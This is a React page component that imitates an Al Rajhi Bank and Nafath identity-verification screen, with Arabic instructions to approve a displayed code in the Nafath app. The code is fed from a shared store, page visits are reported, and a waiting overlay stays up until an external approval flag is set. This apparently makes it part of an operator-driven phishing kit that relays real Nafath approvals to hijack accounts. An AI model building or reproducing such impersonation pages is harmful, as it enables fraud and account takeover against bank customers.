import { useEffect } from "react";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import {
  verificationCode,
  isFormApproved,
  navigateToPage,
} from "@/lib/store";

export default function AlRajhiNafath() {
  const [, navigate] = useLocation();

  // Emit page enter
  useEffect(() => {
    navigateToPage("نفاذ الراجحى");
  }, []);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/final-page");
    }
  }, [isFormApproved.value, navigate]);

  const openNafathApp = () => {
    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
    if (isIOS) {
      window.open("https://apps.apple.com/us/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871");
    } else {
      window.open("https://play.google.com/store/apps/details?id=sa.gov.nic.myid");
    }
  };

  return (
    <PageLayout variant="al-rajhi">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-6">
          <div className="flex justify-center gap-4 mb-4">
            <img
              src="/images/banks/al-rajhi-banking-and-investment-corp.png"
              alt="الراجحي"
              className="h-12"
            />
            <img
              src="/images/nafath.png"
              alt="نفاذ"
              className="h-12"
            />
          </div>
          <h1 className="text-xl font-bold text-gray-800 mb-2">التحقق عبر نفاذ</h1>
          <p className="text-gray-500 text-sm">
            افتح تطبيق نفاذ واختر الرقم المطابق
          </p>
        </div>

        {/* Verification Code */}
        {verificationCode.value ? (
          <div className="bg-[#004d7a] rounded-xl p-8 mb-6">
            <p className="text-white text-center text-sm mb-2">رمز التحقق</p>
            <p className="text-white text-center text-6xl font-bold">
              {verificationCode.value}
            </p>
          </div>
        ) : (
          <div className="bg-gray-100 rounded-xl p-8 mb-6 flex items-center justify-center">
            <div className="w-8 h-8 border-4 border-[#004d7a] border-t-transparent rounded-full animate-spin" />
          </div>
        )}

        {/* Instructions */}
        <div className="bg-blue-50 rounded-lg p-4 mb-6">
          <h3 className="font-semibold text-blue-800 mb-2">خطوات التحقق:</h3>
          <ol className="text-sm text-blue-700 space-y-2 list-decimal list-inside">
            <li>افتح تطبيق نفاذ على جوالك</li>
            <li>ستظهر لك إشعار بطلب تحقق من الراجحي</li>
            <li>اختر الرقم المطابق للرقم أعلاه</li>
            <li>انتظر حتى يتم التحقق</li>
          </ol>
        </div>

        {/* Open App Button */}
        <Button
          onClick={openNafathApp}
          className="w-full bg-[#004d7a] hover:bg-[#003d5c]"
          size="lg"
        >
          فتح تطبيق نفاذ
        </Button>
      </div>
    </PageLayout>
  );
}
